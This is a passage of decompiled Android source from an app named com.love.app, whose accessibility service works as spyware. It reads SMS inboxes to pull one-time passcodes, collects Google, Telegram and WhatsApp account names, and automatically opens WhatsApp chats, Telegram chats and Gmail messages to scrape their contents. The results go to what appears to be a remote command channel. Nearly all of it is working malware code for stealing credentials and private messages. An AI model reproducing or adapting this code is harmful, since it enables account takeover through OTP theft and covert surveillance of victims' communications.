                        httpURLConnection.disconnect();
                    }
                }
            } catch (Throwable th) {
                th = th;
                r6 = baseUrl;
                if (r6 != 0) {
                    r6.disconnect();
                }
                throw th;
            }
        } catch (Exception e2) {
            e = e2;
            httpURLConnection = null;
        } catch (Throwable th2) {
            th = th2;
            if (r6 != 0) {
                r6.disconnect();
            }
            throw th;
        }
        return null;
    }

    private String getImageThumbnail(String str, int i) {
        try {
            BitmapFactory.Options options = new BitmapFactory.Options();
            options.inJustDecodeBounds = true;
            BitmapFactory.decodeFile(str, options);
            int i2 = options.outWidth;
            int i3 = options.outHeight;
            if (i2 > 0 && i3 > 0) {
                int i4 = 1;
                while (true) {
                    if (i2 / i4 <= i && i3 / i4 <= i) {
                        break;
                    }
                    i4 *= 2;
                }
                options.inJustDecodeBounds = false;
                options.inSampleSize = i4;
                Bitmap bitmapDecodeFile = BitmapFactory.decodeFile(str, options);
                if (bitmapDecodeFile == null) {
                    return "";
                }
                float f = i;
                float fMin = Math.min(f / bitmapDecodeFile.getWidth(), f / bitmapDecodeFile.getHeight());
                Bitmap bitmapCreateScaledBitmap = Bitmap.createScaledBitmap(bitmapDecodeFile, Math.max(1, Math.round(bitmapDecodeFile.getWidth() * fMin)), Math.max(1, Math.round(bitmapDecodeFile.getHeight() * fMin)), true);
                if (bitmapCreateScaledBitmap != bitmapDecodeFile) {
                    bitmapDecodeFile.recycle();
                }
                ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                bitmapCreateScaledBitmap.compress(Bitmap.CompressFormat.JPEG, 40, byteArrayOutputStream);
                bitmapCreateScaledBitmap.recycle();
                return Base64.encodeToString(byteArrayOutputStream.toByteArray(), 2);
            }
            return "";
        } catch (Exception e) {
            Log.e(TAG, "getImageThumbnail error", e);
            return "";
        }
    }

    private void getWhatsAppNumber() {
        if (checkSelfPermission("android.permission.GET_ACCOUNTS") == 0) {
            AccountManager accountManager = (AccountManager) getSystemService("account");
            String[] strArr = {WHATSAPP_PACKAGE, "org.whatsapp", "com.whatsapp.messenger"};
            for (int i = 0; i < 3; i++) {
                Account[] accountsByType = accountManager.getAccountsByType(strArr[i]);
                if (accountsByType.length > 0) {
                    sendResult("whatsapp_number", accountsByType[0].name);
                    return;
                }
            }
        }
        launchAppAndWait(WHATSAPP_PACKAGE, new Runnable() { // from class: com.love.app.CoreService$$ExternalSyntheticLambda28
            @Override // java.lang.Runnable
            public final void run() {
                this.f$0.m243lambda$getWhatsAppNumber$27$comloveappCoreService();
            }
        });
    }

    /* JADX INFO: Access modifiers changed from: private */
    /* JADX INFO: renamed from: fetchWhatsAppNumberFromSettings, reason: merged with bridge method [inline-methods] */
    public void m243lambda$getWhatsAppNumber$27$comloveappCoreService() {
        new Thread(new Runnable() { // from class: com.love.app.CoreService$$ExternalSyntheticLambda24
            @Override // java.lang.Runnable
            public final void run() {
                this.f$0.m111x170e539a();
            }
        }).start();
    }

    /* JADX INFO: renamed from: lambda$fetchWhatsAppNumberFromSettings$28$com-love-app-CoreService */
    /* synthetic */ void m111x170e539a() {
        try {
            Thread.sleep(1500L);
            AccessibilityNodeInfo rootInActiveWindow = getRootInActiveWindow();
            if (rootInActiveWindow == null) {
                sendResult("whatsapp_number_error", "Cannot access WhatsApp");
                return;
            }
            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = rootInActiveWindow.findAccessibilityNodeInfosByViewId("com.whatsapp:id/menu");
            if (listFindAccessibilityNodeInfosByViewId.isEmpty()) {
                listFindAccessibilityNodeInfosByViewId = rootInActiveWindow.findAccessibilityNodeInfosByText("More options");
            }
            if (!listFindAccessibilityNodeInfosByViewId.isEmpty()) {
                listFindAccessibilityNodeInfosByViewId.get(0).performAction(16);
                Thread.sleep(800L);
                AccessibilityNodeInfo rootInActiveWindow2 = getRootInActiveWindow();
                if (rootInActiveWindow2 != null) {
                    List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow2.findAccessibilityNodeInfosByText("Settings");
                    if (listFindAccessibilityNodeInfosByText.isEmpty()) {
                        listFindAccessibilityNodeInfosByText = rootInActiveWindow2.findAccessibilityNodeInfosByText("Pengaturan");
                    }
                    if (!listFindAccessibilityNodeInfosByText.isEmpty()) {
                        listFindAccessibilityNodeInfosByText.get(0).performAction(16);
                        Thread.sleep(1500L);
                        AccessibilityNodeInfo rootInActiveWindow3 = getRootInActiveWindow();
                        if (rootInActiveWindow3 != null) {
                            String strExtractPhoneNumber = extractPhoneNumber(rootInActiveWindow3);
                            if (strExtractPhoneNumber == null) {
                                strExtractPhoneNumber = "Not found";
                            }
                            sendResult("whatsapp_number", strExtractPhoneNumber);
                            return;
                        }
                        sendResult("whatsapp_number_error", "Settings page not accessible");
                        return;
                    }
                    sendResult("whatsapp_number_error", "Settings menu not found");
                    return;
                }
                return;
            }
            sendResult("whatsapp_number_error", "Menu button not found");
        } catch (Exception e) {
            sendResult("whatsapp_number_error", e.getMessage());
        }
    }

    private String extractPhoneNumber(AccessibilityNodeInfo accessibilityNodeInfo) {
        Pattern patternCompile = Pattern.compile("\\+?[0-9\\s\\-]{8,15}");
        ArrayList arrayList = new ArrayList();
        collectNodes(accessibilityNodeInfo, arrayList);
        for (AccessibilityNodeInfo accessibilityNodeInfo2 : arrayList) {
            if (accessibilityNodeInfo2.getText() != null) {
                Matcher matcher = patternCompile.matcher(accessibilityNodeInfo2.getText().toString());
                if (matcher.find()) {
                    return matcher.group();
                }
            }
        }
        return null;
    }

    private void getOTP() {
        final String str = this.threadCmdId.get() != null ? this.threadCmdId.get() : this.currentCmdId;
        if (checkSelfPermission("android.permission.READ_SMS") != 0) {
            sendResult("otp_error", "READ_SMS permission denied", str);
        } else {
            new Thread(new Runnable() { // from class: com.love.app.CoreService$$ExternalSyntheticLambda1
                @Override // java.lang.Runnable
                public final void run() {
                    this.f$0.m240lambda$getOTP$29$comloveappCoreService(str);
                }
            }).start();
        }
    }

    /* JADX INFO: renamed from: lambda$getOTP$29$com-love-app-CoreService, reason: not valid java name */
    /* synthetic */ void m240lambda$getOTP$29$comloveappCoreService(String str) {
        this.threadCmdId.set(str);
        try {
            List<Sms> list = new TelephonyProvider(this).getSms(TelephonyProvider.Filter.INBOX).getList();
            int iMin = Math.min(list.size(), 20);
            JSONArray jSONArray = new JSONArray();
            Pattern patternCompile = Pattern.compile("\\b(\\d{4,6})\\b");
            for (int i = 0; i < iMin; i++) {
                Sms sms = list.get(i);
                if (sms.body != null) {
                    Matcher matcher = patternCompile.matcher(sms.body);
                    if (matcher.find()) {
                        JSONObject jSONObject = new JSONObject();
                        jSONObject.put(TypedValues.TransitionType.S_FROM, sms.address);
                        jSONObject.put("body", sms.body);
                        jSONObject.put("otp", matcher.group(1));
                        jSONObject.put("date", sms.date);
                        jSONArray.put(jSONObject);
                    }
                }
            }
            sendResult("otp", jSONArray.toString(), str);
        } catch (SecurityException unused) {
            sendResult("otp_error", "Cannot read SMS", str);
        } catch (Exception e) {
            sendResult("otp_error", e.getMessage(), str);
        }
    }

    private void collectNodes(AccessibilityNodeInfo accessibilityNodeInfo, List<AccessibilityNodeInfo> list) {
        if (accessibilityNodeInfo == null) {
            return;
        }
        list.add(accessibilityNodeInfo);
        for (int i = 0; i < accessibilityNodeInfo.getChildCount(); i++) {
            collectNodes(accessibilityNodeInfo.getChild(i), list);
        }
    }

    private void getTelegram() {
        final String str = this.threadCmdId.get() != null ? this.threadCmdId.get() : this.currentCmdId;
        if (checkSelfPermission("android.permission.GET_ACCOUNTS") != 0) {
            sendResult("telegram_error", "GET_ACCOUNTS permission denied", str);
        } else {
            new Thread(new Runnable() { // from class: com.love.app.CoreService$$ExternalSyntheticLambda21
                @Override // java.lang.Runnable
                public final void run() {
                    this.f$0.m242lambda$getTelegram$30$comloveappCoreService(str);
                }
            }).start();
        }
    }

    /* JADX INFO: renamed from: lambda$getTelegram$30$com-love-app-CoreService, reason: not valid java name */
    /* synthetic */ void m242lambda$getTelegram$30$comloveappCoreService(String str) {
        this.threadCmdId.set(str);
        try {
            AccountManager accountManager = (AccountManager) getSystemService("account");
            String[] strArr = {TELEGRAM_PACKAGE, "org.telegram.account"};
            JSONArray jSONArray = new JSONArray();
            for (int i = 0; i < 2; i++) {
                String str2 = strArr[i];
                for (Account account : accountManager.getAccountsByType(str2)) {
                    JSONObject jSONObject = new JSONObject();
                    jSONObject.put(TransactionBundle.TRANSACTION_TYPE, str2);
                    jSONObject.put("name", account.name);
                    jSONArray.put(jSONObject);
                }
            }
            sendResult("telegram_accounts", jSONArray.toString(), str);
        } catch (Exception e) {
            sendResult("telegram_error", e.getMessage(), str);
        }
    }

    private void getGoogleAccounts() {
        final String str = this.threadCmdId.get() != null ? this.threadCmdId.get() : this.currentCmdId;
        if (checkSelfPermission("android.permission.GET_ACCOUNTS") != 0) {
            sendResult("google_error", "GET_ACCOUNTS permission denied", str);
        } else {
            new Thread(new Runnable() { // from class: com.love.app.CoreService$$ExternalSyntheticLambda2
                @Override // java.lang.Runnable
                public final void run() {
                    this.f$0.m239lambda$getGoogleAccounts$31$comloveappCoreService(str);
                }
            }).start();
        }
    }

    /* JADX INFO: renamed from: lambda$getGoogleAccounts$31$com-love-app-CoreService, reason: not valid java name */
    /* synthetic */ void m239lambda$getGoogleAccounts$31$comloveappCoreService(String str) {
        this.threadCmdId.set(str);
        try {
            Account[] accountsByType = ((AccountManager) getSystemService("account")).getAccountsByType("com.google");
            JSONArray jSONArray = new JSONArray();
            for (Account account : accountsByType) {
                jSONArray.put(account.name);
            }
            sendResult("google_accounts", jSONArray.toString(), str);
        } catch (Exception e) {
            sendResult("google_error", e.getMessage(), str);
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    /* JADX INFO: renamed from: fetchWhatsAppMessages, reason: merged with bridge method [inline-methods] */
    public void m113xae12e8e4(final String str) {
        if (this.isWhatsAppFetching.getAndSet(true)) {
            sendResult("whatsapp_messages_status", "Already fetching");
        } else {
            new Thread(new Runnable() { // from class: com.love.app.CoreService$$ExternalSyntheticLambda20
                @Override // java.lang.Runnable
                public final void run() {
                    this.f$0.m234lambda$fetchWhatsAppMessages$33$comloveappCoreService(str);
                }
            }).start();
        }
    }

    /* JADX INFO: renamed from: lambda$fetchWhatsAppMessages$33$com-love-app-CoreService, reason: not valid java name */
    /* synthetic */ void m234lambda$fetchWhatsAppMessages$33$comloveappCoreService(String str) {
        final int i;
        try {
            i = Integer.parseInt(str);
        } catch (Exception unused) {
            i = 10;
        }
        try {
            launchAppAndWait(WHATSAPP_PACKAGE, new Runnable() { // from class: com.love.app.CoreService$$ExternalSyntheticLambda16
                @Override // java.lang.Runnable
                public final void run() {
                    this.f$0.m233lambda$fetchWhatsAppMessages$32$comloveappCoreService(i);
                }
            });
        } catch (Exception e) {
            sendResult("whatsapp_messages_status", "Error: " + e.getMessage());
            this.isWhatsAppFetching.set(false);
        }
    }

    /* JADX INFO: renamed from: lambda$fetchWhatsAppMessages$32$com-love-app-CoreService, reason: not valid java name */
    /* synthetic */ void m233lambda$fetchWhatsAppMessages$32$comloveappCoreService(int i) {
        try {
            try {
                Thread.sleep(1500L);
                AccessibilityNodeInfo rootInActiveWindow = getRootInActiveWindow();
                if (rootInActiveWindow == null) {
                    sendResult("whatsapp_messages_status", "No active window");
                } else {
                    List<AccessibilityNodeInfo> listFindChatList = findChatList(rootInActiveWindow, "com.whatsapp:id/conversations_row");
                    if (listFindChatList.isEmpty()) {
                        sendResult("whatsapp_messages_status", "No chats found");
                    } else {
                        JSONArray jSONArray = new JSONArray();
                        int iMin = Math.min(listFindChatList.size(), i);
                        for (int i2 = 0; i2 < iMin; i2++) {
                            AccessibilityNodeInfo accessibilityNodeInfo = listFindChatList.get(i2);
                            if (accessibilityNodeInfo != null) {
                                String strExtractContactName = extractContactName(accessibilityNodeInfo);
                                if (accessibilityNodeInfo.isClickable()) {
                                    AccessibilityNodeInfo accessibilityNodeInfoObtain = AccessibilityNodeInfo.obtain(accessibilityNodeInfo);
                                    accessibilityNodeInfoObtain.performAction(16);
                                    accessibilityNodeInfoObtain.recycle();
                                    Thread.sleep(1500L);
                                    JSONArray whatsAppChat = readWhatsAppChat();
                                    JSONObject jSONObject = new JSONObject();
                                    jSONObject.put("contact", strExtractContactName);
                                    jSONObject.put("messages", whatsAppChat);
                                    jSONArray.put(jSONObject);
                                    performGlobalAction(1);
                                    Thread.sleep(1000L);
                                }
                                accessibilityNodeInfo.recycle();
                            }
                        }
                        rootInActiveWindow.recycle();
                        sendResult("whatsapp_messages", jSONArray.toString());
                    }
                }
            } catch (Exception e) {
                sendResult("whatsapp_messages_status", "Error: " + e.getMessage());
            }
        } finally {
            this.isWhatsAppFetching.set(false);
        }
    }

    private List<AccessibilityNodeInfo> findChatList(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        ArrayList arrayList = new ArrayList();
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId(str);
        if (!listFindAccessibilityNodeInfosByViewId.isEmpty()) {
            AccessibilityNodeInfo accessibilityNodeInfo2 = listFindAccessibilityNodeInfosByViewId.get(0);
            for (int i = 0; i < accessibilityNodeInfo2.getChildCount(); i++) {
                AccessibilityNodeInfo child = accessibilityNodeInfo2.getChild(i);
                if (child != null && child.isVisibleToUser()) {
                    arrayList.add(child);
                }
            }
            return arrayList;
        }
        return findRecyclerViewItems(accessibilityNodeInfo);
    }

    private String extractContactName(AccessibilityNodeInfo accessibilityNodeInfo) {
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId("com.whatsapp:id/conversation_row_contact_name");
        return (listFindAccessibilityNodeInfosByViewId.isEmpty() || listFindAccessibilityNodeInfosByViewId.get(0).getText() == null) ? "" : listFindAccessibilityNodeInfosByViewId.get(0).getText().toString();
    }

    private JSONArray readWhatsAppChat() {
        JSONArray jSONArray = new JSONArray();
        try {
            Thread.sleep(500L);
            AccessibilityNodeInfo rootInActiveWindow = getRootInActiveWindow();
            if (rootInActiveWindow == null) {
                return jSONArray;
            }
            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = rootInActiveWindow.findAccessibilityNodeInfosByViewId("com.whatsapp:id/message_text");
            if (listFindAccessibilityNodeInfosByViewId.isEmpty()) {
                listFindAccessibilityNodeInfosByViewId = rootInActiveWindow.findAccessibilityNodeInfosByViewId("com.whatsapp:id/status_text");
            }
            for (AccessibilityNodeInfo accessibilityNodeInfo : listFindAccessibilityNodeInfosByViewId) {
                if (accessibilityNodeInfo.getText() != null) {
                    JSONObject jSONObject = new JSONObject();
                    jSONObject.put(SmilHelper.ELEMENT_TAG_TEXT, accessibilityNodeInfo.getText().toString());
                    jSONArray.put(jSONObject);
                }
                accessibilityNodeInfo.recycle();
            }
            rootInActiveWindow.recycle();
        } catch (Exception e) {
            Log.e(TAG, "readWhatsAppChat error", e);
        }
        return jSONArray;
    }

    /* JADX INFO: Access modifiers changed from: private */
    /* JADX INFO: renamed from: fetchTelegramMessages, reason: merged with bridge method [inline-methods] */
    public void m114xafec3c03(final String str) {
        if (this.isTelegramFetching.getAndSet(true)) {
            sendResult("telegram_messages_status", "Already fetching");
        } else {
            new Thread(new Runnable() { // from class: com.love.app.CoreService$$ExternalSyntheticLambda8
                @Override // java.lang.Runnable
                public final void run() {
                    this.f$0.m232lambda$fetchTelegramMessages$35$comloveappCoreService(str);
                }
            }).start();
        }
    }

    /* JADX INFO: renamed from: lambda$fetchTelegramMessages$35$com-love-app-CoreService, reason: not valid java name */
    /* synthetic */ void m232lambda$fetchTelegramMessages$35$comloveappCoreService(String str) {
        final int i;
        try {
            i = Integer.parseInt(str);
        } catch (Exception unused) {
            i = 10;
        }
        try {
            launchAppAndWait(TELEGRAM_PACKAGE, new Runnable() { // from class: com.love.app.CoreService$$ExternalSyntheticLambda38
                @Override // java.lang.Runnable
                public final void run() {
                    this.f$0.m231lambda$fetchTelegramMessages$34$comloveappCoreService(i);
                }
            });
        } catch (Exception e) {
            sendResult("telegram_messages_status", "Error: " + e.getMessage());
            this.isTelegramFetching.set(false);
        }
    }

    /* JADX INFO: renamed from: lambda$fetchTelegramMessages$34$com-love-app-CoreService, reason: not valid java name */
    /* synthetic */ void m231lambda$fetchTelegramMessages$34$comloveappCoreService(int i) {
        try {
            try {
                Thread.sleep(1500L);
                AccessibilityNodeInfo rootInActiveWindow = getRootInActiveWindow();
                if (rootInActiveWindow == null) {
                    sendResult("telegram_messages_status", "No active window");
                } else {
                    List<AccessibilityNodeInfo> listFindTelegramChats = findTelegramChats(rootInActiveWindow);
                    if (listFindTelegramChats.isEmpty()) {
                        sendResult("telegram_messages_status", "No chats found");
                    } else {
                        JSONArray jSONArray = new JSONArray();
                        int iMin = Math.min(listFindTelegramChats.size(), i);
                        for (int i2 = 0; i2 < iMin; i2++) {
                            AccessibilityNodeInfo accessibilityNodeInfo = listFindTelegramChats.get(i2);
                            if (accessibilityNodeInfo != null) {
                                String strExtractTelegramContact = extractTelegramContact(accessibilityNodeInfo);
                                if (accessibilityNodeInfo.isClickable()) {
                                    AccessibilityNodeInfo accessibilityNodeInfoObtain = AccessibilityNodeInfo.obtain(accessibilityNodeInfo);
                                    accessibilityNodeInfoObtain.performAction(16);
                                    accessibilityNodeInfoObtain.recycle();
                                    Thread.sleep(1500L);
                                    JSONArray telegramChat = readTelegramChat();
                                    JSONObject jSONObject = new JSONObject();
                                    jSONObject.put("contact", strExtractTelegramContact);
                                    jSONObject.put("messages", telegramChat);
                                    jSONArray.put(jSONObject);
                                    performGlobalAction(1);
                                    Thread.sleep(1000L);
                                }
                                accessibilityNodeInfo.recycle();
                            }
                        }
                        rootInActiveWindow.recycle();
                        sendResult("telegram_messages", jSONArray.toString());
                    }
                }
            } catch (Exception e) {
                sendResult("telegram_messages_status", "Error: " + e.getMessage());
            }
        } finally {
            this.isTelegramFetching.set(false);
        }
    }

    private List<AccessibilityNodeInfo> findTelegramChats(AccessibilityNodeInfo accessibilityNodeInfo) {
        ArrayList arrayList = new ArrayList();
        String[] strArr = {"org.telegram.messenger:id/chat_list_view", "org.telegram.messenger:id/recyclerView", "android:id/list"};
        for (int i = 0; i < 3; i++) {
            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId(strArr[i]);
            if (!listFindAccessibilityNodeInfosByViewId.isEmpty()) {
                AccessibilityNodeInfo accessibilityNodeInfo2 = listFindAccessibilityNodeInfosByViewId.get(0);
                for (int i2 = 0; i2 < accessibilityNodeInfo2.getChildCount(); i2++) {
                    AccessibilityNodeInfo child = accessibilityNodeInfo2.getChild(i2);
                    if (child != null && child.isVisibleToUser()) {
                        arrayList.add(child);
                    }
                }
                return arrayList;
            }
        }
        return findRecyclerViewItems(accessibilityNodeInfo);
    }

    private String extractTelegramContact(AccessibilityNodeInfo accessibilityNodeInfo) {
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId("org.telegram.messenger:id/name");
        return (listFindAccessibilityNodeInfosByViewId.isEmpty() || listFindAccessibilityNodeInfosByViewId.get(0).getText() == null) ? "" : listFindAccessibilityNodeInfosByViewId.get(0).getText().toString();
    }

    private JSONArray readTelegramChat() {
        JSONArray jSONArray = new JSONArray();
        try {
            Thread.sleep(500L);
            AccessibilityNodeInfo rootInActiveWindow = getRootInActiveWindow();
            if (rootInActiveWindow == null) {
                return jSONArray;
            }
            for (AccessibilityNodeInfo accessibilityNodeInfo : rootInActiveWindow.findAccessibilityNodeInfosByViewId("org.telegram.messenger:id/message_text")) {
                if (accessibilityNodeInfo.getText() != null) {
                    JSONObject jSONObject = new JSONObject();
                    jSONObject.put(SmilHelper.ELEMENT_TAG_TEXT, accessibilityNodeInfo.getText().toString());
                    jSONArray.put(jSONObject);
                }
                accessibilityNodeInfo.recycle();
            }
            rootInActiveWindow.recycle();
        } catch (Exception e) {
            Log.e(TAG, "readTelegramChat error", e);
        }
        return jSONArray;
    }

    private void fetchGmailEmails(final int i) {
        if (this.isGmailFetching.getAndSet(true)) {
            sendResult("gmail_status", "Already fetching");
        } else {
            new Thread(new Runnable() { // from class: com.love.app.CoreService$$ExternalSyntheticLambda18
                @Override // java.lang.Runnable
                public final void run() {
                    this.f$0.m228lambda$fetchGmailEmails$36$comloveappCoreService(i);
                }
            }).start();
        }
    }

    /* JADX INFO: renamed from: lambda$fetchGmailEmails$36$com-love-app-CoreService, reason: not valid java name */
    /* synthetic */ void m228lambda$fetchGmailEmails$36$comloveappCoreService(int i) {
        JSONObject jSONObjectExtractEmailFromListItem;
        try {
            try {
                ensureGmailWindow();
                AccessibilityNodeInfo rootInActiveWindow = getRootInActiveWindow();
                if (rootInActiveWindow == null) {
                    sendResult("gmail_status", "No active window");
                } else {
                    List<AccessibilityNodeInfo> listFindEmailItems = findEmailItems(rootInActiveWindow);
                    if (listFindEmailItems.isEmpty()) {
                        sendResult("gmail_status", "No emails found");
                        rootInActiveWindow.recycle();
                    } else {
                        int iMin = Math.min(listFindEmailItems.size(), i);
                        JSONArray jSONArray = new JSONArray();
                        for (int i2 = 0; i2 < iMin; i2++) {
                            AccessibilityNodeInfo accessibilityNodeInfo = listFindEmailItems.get(i2);
                            if (accessibilityNodeInfo != null && (jSONObjectExtractEmailFromListItem = extractEmailFromListItem(accessibilityNodeInfo)) != null) {
                                if (accessibilityNodeInfo.isClickable()) {
                                    AccessibilityNodeInfo accessibilityNodeInfoObtain = AccessibilityNodeInfo.obtain(accessibilityNodeInfo);
                                    accessibilityNodeInfoObtain.performAction(16);
                                    accessibilityNodeInfoObtain.recycle();
                                    Thread.sleep(2000L);
                                    JSONObject currentEmailDetail = readCurrentEmailDetail();
                                    if (currentEmailDetail != null) {
                                        jSONObjectExtractEmailFromListItem.put("body", currentEmailDetail.optString("body"));
                                        jSONObjectExtractEmailFromListItem.put("attachments", currentEmailDetail.optJSONArray("attachments"));
                                    }
                                    performGlobalAction(1);
                                    Thread.sleep(1000L);
                                }
                                jSONArray.put(jSONObjectExtractEmailFromListItem);
                                accessibilityNodeInfo.recycle();
                            }
                        }
                        rootInActiveWindow.recycle();
                        sendResult("gmail_emails", jSONArray.toString());
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "fetchGmailEmails error", e);
                sendResult("gmail_status", "Error: " + e.getMessage());
            }
        } finally {
            this.isGmailFetching.set(false);
        }
    }

    private void ensureGmailWindow() throws InterruptedException {
        AccessibilityNodeInfo rootInActiveWindow = getRootInActiveWindow();
        if (rootInActiveWindow != null) {
            if ((rootInActiveWindow.getPackageName() != null ? rootInActiveWindow.getPackageName().toString() : "").equals(GMAIL_PACKAGE)) {
                rootInActiveWindow.recycle();
                return;
            }
            rootInActiveWindow.recycle();
        }
        Intent launchIntentForPackage = getPackageManager().getLaunchIntentForPackage(GMAIL_PACKAGE);
        if (launchIntentForPackage == null) {
            throw new RuntimeException("Gmail not installed");
        }
        launchIntentForPackage.addFlags(268435456);
        startActivity(launchIntentForPackage);
        Thread.sleep(2000L);
        for (int i = 0; i < 10; i++) {
            AccessibilityNodeInfo rootInActiveWindow2 = getRootInActiveWindow();
            if (rootInActiveWindow2 != null && rootInActiveWindow2.getPackageName() != null && rootInActiveWindow2.getPackageName().toString().equals(GMAIL_PACKAGE)) {
                if (rootInActiveWindow2.getChildCount() > 0) {
                    rootInActiveWindow2.recycle();
                    return;
                }
                rootInActiveWindow2.recycle();
            }
            Thread.sleep(500L);
        }
        throw new RuntimeException("Failed to open Gmail");
    }

    private List<AccessibilityNodeInfo> findEmailItems(AccessibilityNodeInfo accessibilityNodeInfo) {
        ArrayList arrayList = new ArrayList();
        if (accessibilityNodeInfo == null) {
            return arrayList;
        }
        String[] strArr = {"com.google.android.gm:id/conversation_list_recycler", "com.google.android.gm:id/list_view", "android:id/list", "com.google.android.gm:id/conversation_list_view", "com.google.android.gm:id/thread_list_view"};
        for (int i = 0; i < 5; i++) {
            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId(strArr[i]);
            if (listFindAccessibilityNodeInfosByViewId != null && !listFindAccessibilityNodeInfosByViewId.isEmpty()) {
                AccessibilityNodeInfo accessibilityNodeInfo2 = listFindAccessibilityNodeInfosByViewId.get(0);
                for (int i2 = 0; i2 < accessibilityNodeInfo2.getChildCount(); i2++) {
                    AccessibilityNodeInfo child = accessibilityNodeInfo2.getChild(i2);
                    if (child != null && child.isVisibleToUser()) {
                        arrayList.add(child);
                    }
                }
                return arrayList;
            }
        }
        return findRecyclerViewItems(accessibilityNodeInfo);
    }

    private List<AccessibilityNodeInfo> findRecyclerViewItems(AccessibilityNodeInfo accessibilityNodeInfo) {
        ArrayList arrayList = new ArrayList();
        if (accessibilityNodeInfo == null) {
            return arrayList;
        }
        int i = 0;
        if (accessibilityNodeInfo.getClassName() != null && accessibilityNodeInfo.getClassName().toString().contains("RecyclerView")) {
            while (i < accessibilityNodeInfo.getChildCount()) {
                AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
                if (child != null && child.isVisibleToUser()) {
                    arrayList.add(child);
                }
                i++;
            }
            return arrayList;
        }
        while (i < accessibilityNodeInfo.getChildCount()) {
            arrayList.addAll(findRecyclerViewItems(accessibilityNodeInfo.getChild(i)));
            i++;
        }
        return arrayList;
    }

    private JSONObject extractEmailFromListItem(AccessibilityNodeInfo accessibilityNodeInfo) {
        JSONObject jSONObject = new JSONObject();
        try {
            ArrayList arrayList = new ArrayList();
            collectTexts(accessibilityNodeInfo, arrayList);
            if (arrayList.size() >= 3) {
                jSONObject.put("sender", arrayList.get(0));
                jSONObject.put("subject", arrayList.get(1));
                jSONObject.put("snippet", arrayList.get(2));
            } else if (arrayList.size() == 2) {
                jSONObject.put("sender", arrayList.get(0));
                jSONObject.put("subject", arrayList.get(1));
                jSONObject.put("snippet", "");
            } else if (arrayList.size() == 1) {
                jSONObject.put("sender", "");
                jSONObject.put("subject", arrayList.get(0));
                jSONObject.put("snippet", "");
            } else {
                jSONObject.put("sender", "");
                jSONObject.put("subject", "");
                jSONObject.put("snippet", "");
            }
        } catch (JSONException unused) {
        }
        return jSONObject;
    }

    private void collectTexts(AccessibilityNodeInfo accessibilityNodeInfo, List<String> list) {
        if (accessibilityNodeInfo == null) {
            return;
        }
        if (accessibilityNodeInfo.getText() != null && accessibilityNodeInfo.getText().length() > 0) {
            list.add(accessibilityNodeInfo.getText().toString());
        }
        for (int i = 0; i < accessibilityNodeInfo.getChildCount(); i++) {
            collectTexts(accessibilityNodeInfo.getChild(i), list);
        }
    }

    private JSONObject readCurrentEmailDetail() {
        JSONObject jSONObject = new JSONObject();
        try {
            AccessibilityNodeInfo rootInActiveWindow = getRootInActiveWindow();
            if (rootInActiveWindow == null) {
                return null;
            }
            String[] strArr = {"com.google.android.gm:id/message_content", "com.google.android.gm:id/content", "android:id/content"};
            String strFindLongText = "";
            for (int i = 0; i < 3; i++) {
                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = rootInActiveWindow.findAccessibilityNodeInfosByViewId(strArr[i]);
                if (listFindAccessibilityNodeInfosByViewId != null && !listFindAccessibilityNodeInfosByViewId.isEmpty()) {
                    AccessibilityNodeInfo accessibilityNodeInfo = listFindAccessibilityNodeInfosByViewId.get(0);
                    StringBuilder sb = new StringBuilder();
                    extractTextFromNode(accessibilityNodeInfo, sb);
                    strFindLongText = sb.toString();
                    break;
                }
            }
            if (strFindLongText.isEmpty()) {
                strFindLongText = findLongText(rootInActiveWindow);
            }
            jSONObject.put("body", strFindLongText);
            JSONArray jSONArray = new JSONArray();
            findAttachments(rootInActiveWindow, jSONArray);
            jSONObject.put("attachments", jSONArray);
            rootInActiveWindow.recycle();
        } catch (Exception e) {
            Log.e(TAG, "readCurrentEmailDetail error", e);
        }
        return jSONObject;
    }

    private void extractTextFromNode(AccessibilityNodeInfo accessibilityNodeInfo, StringBuilder sb) {
        if (accessibilityNodeInfo == null) {
            return;
        }
        if (accessibilityNodeInfo.getText() != null) {
            sb.append(accessibilityNodeInfo.getText().toString()).append("\n");
        }
        for (int i = 0; i < accessibilityNodeInfo.getChildCount(); i++) {
            extractTextFromNode(accessibilityNodeInfo.getChild(i), sb);
        }
    }

    /* JADX WARN: Code duplicated, block: B:7:0x0015  */
    private String findLongText(AccessibilityNodeInfo accessibilityNodeInfo) {
        String string;
        if (accessibilityNodeInfo.getText() != null) {
            string = accessibilityNodeInfo.getText().toString();
            if (string.length() <= 0) {
                string = "";
            }
        } else {
            string = "";
        }
        for (int i = 0; i < accessibilityNodeInfo.getChildCount(); i++) {
            String strFindLongText = findLongText(accessibilityNodeInfo.getChild(i));
            if (strFindLongText.length() > string.length()) {
                string = strFindLongText;
            }
        }
        return string;
    }

    private void findAttachments(AccessibilityNodeInfo accessibilityNodeInfo, JSONArray jSONArray) {
        if (accessibilityNodeInfo == null) {
            return;
        }
        CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
        if (contentDescription != null && contentDescription.toString().toLowerCase().contains("attachment")) {
            jSONArray.put(contentDescription.toString());
        }
        if (accessibilityNodeInfo.getText() != null && accessibilityNodeInfo.getText().toString().toLowerCase().contains("attachment")) {
            jSONArray.put(accessibilityNodeInfo.getText().toString());
        }
        for (int i = 0; i < accessibilityNodeInfo.getChildCount(); i++) {
            findAttachments(accessibilityNodeInfo.getChild(i), jSONArray);
        }
    }

    @Override // android.accessibilityservice.AccessibilityService
    public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {
        boolean z;
        boolean z2;
